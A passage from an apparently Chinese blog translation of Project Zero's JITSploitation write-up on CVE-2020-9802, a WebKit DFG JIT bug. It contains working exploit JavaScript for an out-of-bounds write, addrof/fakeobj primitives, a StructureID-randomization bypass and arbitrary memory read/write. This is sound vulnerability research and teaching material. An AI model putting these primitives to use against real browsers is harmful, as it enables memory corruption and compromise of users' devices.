(jsc) stopped.</span><br><span class="line">   (lldb) reg read <span class="built_in">rcx</span></span><br><span class="line">        <span class="built_in">rcx</span> = <span class="number">0x0000000080000000</span></span><br></pre></td></tr></table></figure>

<p>然而，不方便的是，越界索引（在rcx中）将始终是INT_MIN，因此访问数组后面的 <code>0x80000000 * 8 = 16GB</code>。虽然可能可以利用，但它并不是最好的利用原语。</p>
<p>实现任意索引的OOB访问（具有任意索引的越界访问）的最后一个技巧是从i中减去一个常数，这将使INT_MIN变成任意正数。由于DFG编译器认为i始终为正数，因此减法将不受检查，因此溢出将不会被注意到。</p>
<p>但是，由于减法会使有关下限的整数范围信息无效，因此之后需要进行额外的<code>if i &gt; 0</code>检查，以再次触发边界检查消除。此外，由于减法会将训练期间使用的整数变成越界索引，因此只有在输入值为负数时才会有条件地执行。幸运的是，DFG编译器还不够聪明，无法确定该条件永远不应为真，在这种情况下它可以完全优化减法。</p>
<p>综上所述，下面再次展示了从开始时的函数，但这次带有注释。当被JIT编译并被赋予<code>INT_MIN</code>作为<code>n</code>时，它会导致一个受控值（<code>0x0000133700001337</code>）的越界写入，直接写入内存中紧随<code>arr</code>之后的JSArray的长度字段。请注意，这一步的成功取决于正确的堆布局。然而，由于这个漏洞足够强大，可以用于受控的越界读取，因此可以在触发内存损坏之前确保正确的堆布局存在。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hax</span>(<span class="params">arr, n</span>) &#123;</span><br><span class="line">    <span class="comment">// Force n to be a 32bit integer.</span></span><br><span class="line">    n |= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Let IntegerRangeOptimization know that </span></span><br><span class="line">    <span class="comment">// n will be a negative number inside the body.</span></span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Force &quot;non-number bytecode usage&quot; so the negation </span></span><br><span class="line">        <span class="comment">// becomes unchecked and as such INT_MIN will again</span></span><br><span class="line">        <span class="comment">// become INT_MIN in the last iteration.</span></span><br><span class="line">        <span class="keyword">let</span> v = (-n)|<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// As n is known to be negative here, this ArithAbs </span></span><br><span class="line">        <span class="comment">// will become a ArithNegate. That negation will be </span></span><br><span class="line">        <span class="comment">// checked, but then be CSE&#x27;d for the previous, </span></span><br><span class="line">        <span class="comment">// unchecked one. This is the compiler bug.</span></span><br><span class="line">        <span class="keyword">let</span> i = <span class="title class_">Math</span>.<span class="title function_">abs</span>(n);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// However, IntegerRangeOptimization has also marked </span></span><br><span class="line">        <span class="comment">// i as being &gt;= 0...</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i &lt; arr.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="comment">// .. so here IntegerRangeOptimization now believes </span></span><br><span class="line">            <span class="comment">// i will be in the range [0, arr.length) while i </span></span><br><span class="line">            <span class="comment">// will actually be INT_MIN in the final iteration.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// This condition is written this way so integer </span></span><br><span class="line">            <span class="comment">// range optimization isn&#x27;t able to propagate range </span></span><br><span class="line">            <span class="comment">// information (in particular that i must be a </span></span><br><span class="line">            <span class="comment">// negative integer) into the body.</span></span><br><span class="line">            <span class="keyword">if</span> (i &amp; <span class="number">0x80000000</span>) &#123;</span><br><span class="line">                <span class="comment">// In the last iteration, this will turn INT_MIN </span></span><br><span class="line">                <span class="comment">// into an arbitrary, positive number since the</span></span><br><span class="line">                <span class="comment">// ArithAdd has been made unchecked by integer range</span></span><br><span class="line">                <span class="comment">// optimization (as it believes i to be a positive</span></span><br><span class="line">                <span class="comment">// number) and so doesn&#x27;t bail out when overflowing</span></span><br><span class="line">                <span class="comment">// int32.</span></span><br><span class="line">                i += -<span class="number">0x7ffffff9</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// This conditional branch is now necessary due to </span></span><br><span class="line">            <span class="comment">// the subtraction above. Otherwise, </span></span><br><span class="line">            <span class="comment">// IntegerRangeOptimization couldn’t prove that i </span></span><br><span class="line">            <span class="comment">// was always positive.</span></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// In here, IntegerRangeOptimization again believes</span></span><br><span class="line">                <span class="comment">// i to be in the range [0, arr.length) and thus</span></span><br><span class="line">                <span class="comment">// eliminates the CheckBounds node, leading to a </span></span><br><span class="line">                <span class="comment">// controlled OOB access. This write will then corrupt</span></span><br><span class="line">                <span class="comment">// the header of the following JSArray, setting its</span></span><br><span class="line">                <span class="comment">// length and capacity to 0x1337.</span></span><br><span class="line">                arr[i] = <span class="number">1.04380972981885e-310</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Addrof-Fakeobj"><a href="#Addrof-Fakeobj" class="headerlink" title="Addrof&#x2F;Fakeobj"></a>Addrof&#x2F;Fakeobj</h3><blockquote>
<p><code>Addrof</code>和<code>fakeobj</code>是JS引擎漏洞利用中常见的两种原语，通常用于实现<strong>地址泄露和伪造对象</strong>。</p>
<p><code>addrof</code> 是一种用于泄露 JavaScript 对象内存地址的原语。</p>
<p><strong>原理</strong></p>
<ul>
<li>JavaScript 引擎通常会将对象的地址存储在内存中，但这些地址对 JavaScript 代码是不可见的。</li>
<li>通过某些漏洞（如类型混淆、越界访问等），攻击者可以绕过引擎的保护机制，读取对象的内存地址。</li>
</ul>
<p><code>fakeobj</code> 是一种用于伪造 JavaScript 对象的原语。</p>
<p><strong>原理</strong></p>
<ul>
<li>JavaScript 引擎通过内存中的数据结构来表示对象（如隐藏类、属性存储区等）。</li>
<li>通过某些漏洞，攻击者可以构造一个伪造的对象，并将其传递给引擎，使引擎将其视为合法的对象。</li>
</ul>
</blockquote>
<p>至此，可以构建两个低级别的漏洞利用原语<code>addrof</code>和<code>fakeobj</code>。原语<code>addrof(obj)</code>返回给定JavaScript对象在内存中的地址（作为双精度浮点数）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">a</span>: <span class="number">42</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> addr = <span class="title function_">addrof</span>(obj);</span><br><span class="line"><span class="comment">// 2.211548541e-314 (0x000000010acdc250 as 64bit integer)</span></span><br></pre></td></tr></table></figure>

<p>fakeobj(addr)原语返回一个包含给定地址作为有效负载的JSValue：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj2 = <span class="title function_">fakeobj</span>(addr);</span><br><span class="line">obj2 === obj;</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>这些原语非常有用，因为它们基本上可以实现两件事：打破堆 ASLR，以便将受控数据放置在已知地址，并提供一种构造和“注入”假对象到引擎的方法。但有关利用的更多内容请参见第 II 节。</p>
<img src="/2025/03/12/CVE-2020-9802-JSC%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250309222704570.png" class="" title="image-20250309222704570">

<p>这两个原语可以用两个具有不同存储类型的JSArray来构造：通过重叠一个存储（unboxed&#x2F;raw）双精度浮点数的JSArray与一个存储JSValue的JSArray（boxed&#x2F;tagged的值，例如可以是JSObject的指针）</p>
<blockquote>
<p>unboxed&#x2F;raw ： 这种数组直接将双精度浮点数存储在数组的连续内存空间中，没有额外的元数据或标记。这种存储效率很高，但只能存储双精度浮点数。</p>
<p>JSValues（boxed&#x2F;tagged）：boxing指将原始类型（例如数字、布尔值）包装成对象。tagging指的是在JSValue中使用一些位来表示值的类型。例如，可以使用一个位来区分整数和指针。</p>
</blockquote>
<p>然后允许通过<code>float_arr</code>以双精度形式读取&#x2F;写入obj_arr中的指针值：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> noCoW = <span class="number">13.37</span>;</span><br><span class="line"><span class="keyword">let</span> target = [noCoW, <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>];</span><br><span class="line"><span class="keyword">let</span> float_arr = [noCoW, <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>];</span><br><span class="line"><span class="keyword">let</span> obj_arr = [&#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger the bug to write past the end of the target array and</span></span><br><span class="line"><span class="comment">// thus corrupting the length of the float_arr following it</span></span><br><span class="line"><span class="title function_">hax</span>(target, n);</span><br><span class="line"></span><br><span class="line"><span class="title function_">assert</span>(float_arr.<span class="property">length</span> == <span class="number">0x1337</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// (OOB) index into float_arr that overlaps with the first element    </span></span><br><span class="line"><span class="comment">// of obj_arr.</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">OVERLAP_IDX</span> = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> float_arr[<span class="variable constant_">OVERLAP_IDX</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    float_arr[<span class="variable constant_">OVERLAP_IDX</span>] = addr;</span><br><span class="line">    <span class="keyword">return</span> obj_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请注意<code>noCoW</code>变量的使用有些不直观。它用于阻止JSC将数组分配为写时复制（copy-on-write）数组，否则会导致错误的堆布局。</p>
<blockquote>
<p>copy-on-write（CoW）：是一种优化技术，用于延迟复制资源（例如内存页），直到其中一个 副本被修改时才真正进行复制。在多个进程或对象共享同一资源时，CoW可以节省内存和提高性能。</p>
</blockquote>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>我希望这已经是一个有趣的“非标准”JIT编译器漏洞演练。请记住，有许多（JIT）漏洞更容易被利用。另一方面，利用（到目前为止）并不简单，这也允许在此过程中触及许多JSC和JIT编译器内部。</p>
<blockquote>
<p>翻译自（+了些个人理解）：<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/09/jitsploitation-one.html">JITSpoitation I</a></p>
</blockquote>
<h2 id="JITSpoitation-II-Getting-Read-Write"><a href="#JITSpoitation-II-Getting-Read-Write" class="headerlink" title="JITSpoitation II : Getting Read&#x2F;Write"></a>JITSpoitation II : Getting Read&#x2F;Write</h2><p>这是关于Safari渲染器中由JIT漏洞引发的漏洞利用系列的第二部分。在第一部分中，讨论了DFG JIT在公共子表达式消除实现中的一个漏洞。第二部分从众所周知的<code>addrof</code>和<code>fakeobj</code>原语开始，展示了如何从中构建稳定、任意的内存读&#x2F;写。此，将讨论并绕过 StructureID 随机化缓解措施和 Gigacage。</p>
<h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>早在2016年，攻击者会使用 <code>addrof</code> 和 <code>fakeobj</code> 原语来伪造一个 ArrayBuffer，从而立即获得可靠的任意内存读&#x2F;写原语。 但在 2018 年年中，WebKit 引入了“Gigacage”，试图阻止以这种方式滥用 ArrayBuffer。 Gigacage 的工作原理是将 ArrayBuffer 的后备存储移动到一个 4GB 的堆区域中，并使用 32 位相对偏移量而不是绝对指针来引用它们，从而（或多或少）使得使用 ArrayBuffer 访问 cage 之外的数据成为不可能。</p>
<p>然而，虽然 ArrayBuffer 的存储被 caged （关住）了，但包含数组元素的 JSArray Butterflies 却没有。 由于它们可以存储原始的浮点数值，攻击者可以通过伪造这样一个“未装箱的双精度” JSArray，立即获得相当强大的任意读&#x2F;写能力。 过去，各种公开的漏洞利用程序就是通过这种方式绕过 Gigacage 的。 （不幸的是）WebKit 引入了一种旨在阻止攻击者完全伪造 JavaScript 对象的缓解措施：StructureID 随机化。 因此，必须首先绕过这种缓解措施。</p>
<blockquote>
<p>使用<code>addrof</code>原语获得一个合法的<code>ArrayBuffer</code>的地址。使用<code>fakeobj</code>原语修改一个对象的内存布局，使其对象头与<code>ArrayBuffer</code>的对象头一致。通过漏洞修改伪造的<code>ArrayBuffer</code>的backing store指针，使其指向任意内存地址。</p>
<p>在这里，以本人的基础，后续的缓解机制都难以理解。我认为应该先复现第一批漏洞，也就是WebKit引入第一个缓解机制前（2016年-2018年的JSC漏洞），这样能够清晰这里面的漏洞产生原理，漏洞挖掘机制。后续的补丁，以及缓解机制都是一层一层增加的。那么，这种情况下，也应该一层一层进行剥离。否则难以真正理解这些缓解机制为何这么绕过，难以真正理解漏洞成因。因此就不去翻译第三篇博客了。当后续复现完前面的漏洞后，再来此进行填补。——2025.3.12</p>
</blockquote>
<p>因此，这篇文章将：</p>
<ul>
<li>解释 JSObject 的内存布局</li>
<li>绕过 StructureID 随机化来伪造 JSArray 对象</li>
<li>使用伪造的 JSArray 对象来设置一个（有限的）内存读&#x2F;写原语</li>
<li>突破 Gigacage 以获得快速、可靠且真正任意的读&#x2F;写原语</li>
</ul>
<h3 id="伪造对象"><a href="#伪造对象" class="headerlink" title="伪造对象"></a>伪造对象</h3><p>为了伪造对象，必须了解它们的内存布局。在JSC中，一个普通的JSObject由一个<code>JSCell</code>头部、紧随其后的“Butterfly”以及可能存在的内联属性组成。 Butterfly 是一个存储缓冲区，包含对象的属性和元素以及元素的数量（长度）：</p>
<img src="/2025/03/12/CVE-2020-9802-JSC%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250310155850597.png" class="" title="image-20250310155850597">

<p>像 JSArrayBuffer 这样的对象会在 JSObject 布局中添加更多成员。</p>
<p>每个 JSCell 头部通过 <code>StructureID</code> 字段引用一个 <code>Structure</code>，<code>StructureID</code> 是运行时环境的 <code>StructureIDTable</code> 中的一个索引。 <code>Structure</code> 本质上是一个类型信息的 blob，包含诸如此类的信息：</p>
<ul>
<li>对象的基类型，例如 JSObject、JSArray、JSString、JSUint8Array，…</li>
<li>对象的属性以及它们相对于对象的存储位置</li>
<li>对象的大小（以字节为单位）</li>
<li>索引类型，指示存储在 Butterfly 中的数组元素的类型，例如 JSValue、Int32 或未装箱的双精度浮点数，以及它们是存储为连续的数组还是以其他方式存储，例如在映射中。</li>
<li>等等。</li>
</ul>
<p>最后，剩余的 JSCell 头部位包含诸如 GC 标记状态之类的内容，并“缓存”一些常用的类型信息位，例如索引类型。 下图总结了 64 位架构上普通 JSObject 的内存布局。</p>
<img src="/2025/03/12/CVE-2020-9802-JSC编译优化漏洞复现/image-20250310160146108.png"  alt="image-20250310160146108" style="zoom: 50%;" />

<p>对对象执行的大多数操作都需要查看对象的 Structure，以确定如何处理该对象。 因此，在创建伪造的 JSObject 时，必须知道要伪造的对象类型的 StructureID。 以前，可以使用 StructureID 喷射 (Spraying) 来预测 StructureID。 这种方法通过简单地分配许多所需类型的对象（例如，Uint8Array）并向每个对象添加不同的属性来实现，从而导致为该对象分配唯一的 Structure，进而分配唯一的 StructureID。 这样做一千次也许几乎可以保证 1000 是 Uint8Array 对象的有效 StructureID。 这就是 StructureID 随机化（2019 年初推出的一种新的漏洞利用缓解措施）发挥作用的地方。</p>
<h3 id="StructureID-随机化"><a href="#StructureID-随机化" class="headerlink" title="StructureID 随机化"></a>StructureID 随机化</h3><p>这种漏洞利用缓解措施背后的想法非常简单：由于攻击者（据推测）需要知道有效的 StructureID 才能伪造对象，因此随机化 ID 将会阻碍这一点。 确切的随机化方案已在源代码中得到充分记录。 这样，现在就不可能预测 StructureID 了。</p>
<p>绕过 StructureID 随机化有不同的方法，包括：</p>
<ul>
<li>泄漏有效的 StructureID，例如通过 OOB 读取</li>
<li>滥用不检查 StructureID 的代码，如已证明的那样</li>
<li>构建“StructureID oracle”来暴力破解有效的 StructureID</li>
</ul>
<p>“StructureID oracle”的一个可能的想法是再次滥用 JIT。 编译器发出的一种非常常见的代码模式是 StructureCheck，用于保护类型推测。 在伪 C 代码中，它们大致如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> structID = LoadStructureId(obj)</span><br><span class="line"><span class="keyword">if</span> (structID != EXPECTED_STRUCT_ID) &#123;</span><br><span class="line">    bailout();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这可能允许构建一个“StructureID oracle”：如果可以构造一个 JIT 编译的函数，该函数检查 StructureID，但不使用该 StructureID，那么攻击者应该能够通过观察是否发生了 bailout 来确定 StructureID 是否有效。 反过来，可以通过计时，或者通过“利用” JIT 中的正确性问题来实现这一点，该问题导致相同的代码在 JIT 中运行与在解释器中运行产生不同的结果（在 bailout 后执行将继续）。 像这样的 oracle 将允许攻击者通过预测递增的索引位并暴力破解 7 个熵位来暴力破解有效的结构 ID。</p>
<p>然而，泄漏有效的 StructureID 和滥用不检查 StructureID 的代码似乎是更容易的选择。 特别是，在解释器中加载 JSArray 元素时，有一条代码路径永远不会访问 StructureID：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> ALWAYS_INLINE JSValue <span class="title function_">getByVal</span><span class="params">(VM&amp; vm, JSValue baseValue, JSValue subscript)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...;</span><br><span class="line">    <span class="keyword">if</span> (subscript.isUInt32()) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> i = subscript.asUInt32();</span><br><span class="line">        <span class="keyword">if</span> (baseValue.isObject()) &#123;</span><br><span class="line">            JSObject* object = asObject(baseValue);</span><br><span class="line">            <span class="keyword">if</span> (object-&gt;canGetIndexQuickly(i))</span><br><span class="line">                <span class="keyword">return</span> object-&gt;getIndexQuickly(i);</span><br></pre></td></tr></table></figure>

<p>在这里，<code>getIndexQuickly</code> 直接从 Butterfly 加载元素，而 <code>canGetIndexQuickly</code> 只查看 JSCell 头部中的索引类型（其值为已知的常量）和 Butterfly 中的长度：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">canGetIndexQuickly</span><span class="params">(<span class="type">unsigned</span> i)</span> <span class="type">const</span> &#123;</span><br><span class="line">    <span class="type">const</span> Butterfly* butterfly = this-&gt;butterfly();</span><br><span class="line">    <span class="keyword">switch</span> (indexingType()) &#123;</span><br><span class="line">    ...;</span><br><span class="line">    <span class="keyword">case</span> ALL_CONTIGUOUS_INDEXING_TYPES:</span><br><span class="line">        <span class="keyword">return</span> i &lt; butterfly-&gt;vectorLength() &amp;&amp; butterfly-&gt;contiguous().at(this, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，这允许伪造一个看起来有点像 JSArray 的东西，将其后备存储指针指向另一个有效的 JSArray，然后读取该 JSArray 的 JSCell 头部，其中包含有效的 StructureID：</p>
<img src="/2025/03/12/CVE-2020-9802-JSC编译优化漏洞复现/image-20250310164441325.png"  alt="image-20250310164441325" style="zoom:80%;" />

<p>至此，StructureID 随机化已被完全绕过。</p>
<p>以下 JavaScript 代码实现了这一点，像往常一样通过（滥）用“容器”对象的内联属性来伪造对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> container = &#123;</span><br><span class="line">    <span class="attr">jscell_header</span>: jscell_header,</span><br><span class="line">    <span class="attr">butterfly</span>: legit_float_arr,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> container_addr = <span class="title function_">addrof</span>(container);</span><br><span class="line"><span class="comment">// add offset from container object to its inline properties</span></span><br><span class="line"><span class="keyword">let</span> fake_array_addr = <span class="title class_">Add</span>(container_addr, <span class="number">16</span>);  </span><br><span class="line"><span class="keyword">let</span> fake_arr = <span class="title function_">fakeobj</span>(fake_array_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can now simply read a legitimate JSCell header and use it.</span></span><br><span class="line">jscell_header = fake_arr[<span class="number">0</span>];</span><br><span class="line">container.<span class="property">jscell_header</span> = jscell_header;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can read/write to memory now by corrupting the butterfly</span></span><br><span class="line"><span class="comment">// pointer of the float array.</span></span><br><span class="line">fake_arr[<span class="number">1</span>] = <span class="number">3.54484805889626e-310</span>;    <span class="comment">// 0x414141414141 in hex</span></span><br><span class="line">float_arr[<span class="number">0</span>] = <span class="number">1337</span>;</span><br></pre></td></tr></table></figure>

<p>此代码在访问 0x414141414141 附近的内存时会崩溃。 因此，攻击者现在获得了任意内存读取&#x2F;写入原语，尽管是稍微有限制的一种：</p>
<ul>
<li>只能读取和写入有效的双精度浮点数值</li>
<li>由于 Butterfly 也存储了自己的长度，因此有必要定位 Butterfly 指针，使其长度看起来足够大，以访问所需的数据</li>
</ul>
<h3 id="关于漏洞利用稳定性的说明"><a href="#关于漏洞利用稳定性的说明" class="headerlink" title="关于漏洞利用稳定性的说明"></a>关于漏洞利用稳定性的说明</h3><p>运行当前的漏洞利用程序会产生内存读取&#x2F;写入，但很可能在垃圾收集器下次运行时扫描所有可访问的堆对象后不久崩溃。</p>
<p>实现漏洞利用稳定性的通用方法是使所有堆对象保持在正常运行状态（当 GC 扫描对象并访问所有传出指针时不会导致崩溃的状态），或者，如果这不可能，则在损坏后尽快修复它们。 在此漏洞利用的情况下，<code>fake_arr</code> 最初是“GC 不安全的”，因为它包含无效的 StructureID。 当其 JSCell 稍后被替换为有效的 JSCell（<code>container.jscell_header = jscell_header;</code>）时，伪造的对象变得“GC 安全”，因为它对 GC 来说看起来像一个有效的 JSArray。</p>
<p>但是，某些边缘情况也可能导致损坏的数据存储在引擎的其他地方。 例如，先前 JavaScript 代码段中的数组加载（<code>jscell_header = fake_arr[0];</code>）将由 <code>get_by_val</code> 字节码操作执行。 此操作还会保留上次看到的结构 ID 的缓存，该缓存用于构建 JIT 编译器依赖的值配置文件。 这是有问题的，因为伪造的 JSArray 的结构 ID 无效，因此会导致崩溃，例如当 GC 扫描字节码缓存时。 然而，幸运的是，修复起来相当容易：执行相同的 <code>get_by_val</code> 操作两次，第二次使用有效的 JSArray，其 StructureID 将随后被缓存：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">let</span> fake_arr = <span class="title function_">fakeobj</span>(fake_array_addr);</span><br><span class="line"><span class="keyword">let</span> legit_arr = float_arr;</span><br><span class="line"><span class="keyword">let</span> results = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = i == <span class="number">0</span> ? fake_arr : legit_arr;</span><br><span class="line">    results.<span class="title function_">push</span>(a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">jscell_header = results[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>这样做可以使当前的漏洞利用程序在 GC 执行期间保持稳定。</p>
<h3 id="突破-Giga-Cage"><a href="#突破-Giga-Cage" class="headerlink" title="突破 (Giga-)Cage"></a>突破 (Giga-)Cage</h3><p>注意：这部分主要是一个有趣的 JIT 漏洞利用练习，对于已经构建了足够强大的读&#x2F;写原语的漏洞利用来说，并不是严格必需的。 然而，它可以使漏洞利用程序更快，因为从中获得的读&#x2F;写性能更高，而且是真正任意的。</p>
<p>与本文开头描述的有些相反，JSC 中的 ArrayBuffer 实际上受到两种不同机制的保护：</p>
<ul>
<li>Gigacage：一个多 GB 的虚拟内存区域，其中分配了 TypedArray（以及一些其他对象）的后备存储缓冲区。 后备存储指针现在基本上是从 cage 基址开始的 32 位偏移量，而不是 64 位指针，从而防止访问 cage 之外的内容。</li>
<li>PACCage：除了 Gigacage 之外，TypedArray 后备存储指针现在还通过指针身份验证代码 (PAC) 进行保护（如果可用），防止在堆上篡改它们，因为攻击者通常无法伪造有效的 PAC 签名。</li>
</ul>
<p>用于组合 Gigacage 和 PACCage 的确切方案记录在例如 commit 205711404e 中。 这样，TypedArray 本质上受到了双重保护，因此评估是否仍然可以滥用它们进行读&#x2F;写似乎是一项有价值的尝试。 寻找潜在问题的一个地方再次是 JIT，因为它具有用于提高性能的 TypedArray 的特殊处理。</p>
<h4 id="DFG中的TypedArrays"><a href="#DFG中的TypedArrays" class="headerlink" title="DFG中的TypedArrays"></a>DFG中的TypedArrays</h4><p>考虑以下JavaScript代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) <span class="title function_">opt</span>(a);</span><br></pre></td></tr></table></figure>

<p>在DFG中进行优化时，opt函数将大致转换为以下DFG IR（省略了许多细节）：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CheckInBounds a, <span class="number">0</span></span><br><span class="line"><span class="built_in">v0</span> = GetIndexedPropertyStorage</span><br><span class="line"><span class="built_in">v1</span> = GetByVal <span class="built_in">v0</span>, <span class="number">0</span></span><br><span class="line">Return <span class="built_in">v1</span></span><br></pre></td></tr></table></figure>

